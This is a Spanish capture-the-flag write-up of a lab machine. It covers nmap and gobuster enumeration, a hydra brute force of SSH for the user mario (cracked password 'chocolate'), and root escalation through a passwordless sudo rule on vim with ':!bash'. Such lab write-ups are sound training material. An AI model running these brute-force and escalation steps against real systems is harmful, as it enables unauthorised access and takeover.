## Fase de Reconocimiento y Descubrimiento (Enumeración)

### Escaneo de Puertos (Nmap)
Realizamos un escaneo de puertos inicial con nmap para identificar los servicios activos en la máquina objetivo:

![[Pasted image 20260624125557.png]]

**Servicios identificados:**
* **Puerto 22/TCP (SSH):** Servicio OpenSSH abierto para acceso remoto. Ver teoría en [[Pentesting Notes/1_Enumeration/SSH\|SSH.md]].
* **Puerto 80/TCP (HTTP):** Servidor web Apache corriendo en el host. Ver teoría en [[Pentesting Notes/1_Enumeration/HTTP & HTTPS\|HTTP & HTTPS.md]].

---

## Enumeración Web

### Inspección Inicial y Fuzzing de Directorios
Al ingresar a la web, nos encontramos con la página por defecto de Apache. Para descubrir recursos ocultos, procedemos a realizar fuzzing de directorios y extensiones con gobuster:

```bash
gobuster dir -u 'http://172.17.0.2' -w /usr/share/wordlist/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -x php,html,txt -t 50 --exclude-length 10701
```

![[Pasted image 20260624125713.png]]

* **Hallazgo:** Descubrimos un archivo PHP llamado secret.php.

### Análisis de secret.php
Accedemos al archivo PHP a través del navegador:

![[Pasted image 20260624125858.png]]

Solo observamos texto estático. Inspeccionamos las peticiones GET y cabeceras de respuesta, pero no encontramos nada adicional. Sin embargo, el contexto del reto sugiere el uso del usuario mario en el sistema.

---

## Fase de Explotación / Intrusión

### Fuerza Bruta al SSH (Hydra)
Utilizando el usuario identificado (mario), procedemos a realizar un ataque de fuerza bruta contra el servicio SSH mediante hydra y el diccionario rockyou.txt:

```bash
hydra -l mario -P /usr/share/wordlist/Rockyou.txt -t 50 -I ssh://172.17.0.2
```

![[Pasted image 20260624130031.png]]

* **Credencial encontrada:** mario:chocolate (verificada en el resultado de hydra).
* **Acceso:** Iniciamos sesión vía SSH en el servidor:

![[Pasted image 20260624130050.png]]

---

## Escalada de Privilegios

### Enumeración Interna
Como usuario de bajos privilegios mario, verificamos qué comandos podemos ejecutar con privilegios de superusuario (sudo):

```bash
sudo -l
```

![[Pasted image 20260624130232.png]]

* **Vulnerabilidad de Configuración:** El usuario mario puede ejecutar el binario /usr/bin/vim como root sin necesidad de contraseña (NOPASSWD). Ver teoría en [[Pentesting Notes/3_Post-Explotation/Linux Privilage Escalation/Permissions\|Permissions.md]].

### Explotación de Sudoers (Vim)
Para elevar nuestros privilegios a root, ejecutamos vim a través de sudo y forzamos el escape a una consola del sistema:

Ejecutamos:
```bash
sudo vim
```

Dentro del editor de texto, ejecutamos el siguiente comando:
```text
:!bash
```

![[Pasted image 20260624130345.png]]

¡Logramos obtener una shell con permisos de root con control absoluto de la máquina!

---

## Relaciones y Conceptos
* **Teoría:** [[Pentesting Notes/3_Post-Explotation/Linux Privilage Escalation/Permissions\|Linux Privilege Escalation - Permissions.md]], [[Pentesting Notes/1_Enumeration/SSH\|SSH.md]], [[Pentesting Notes/1_Enumeration/HTTP & HTTPS\|HTTP & HTTPS.md]]
* **Laboratorios Relacionados:** [[Laboratorios/DockerLabs/MuyFacil/Obsession\|Obsession]] (Comparte escalada por vim)
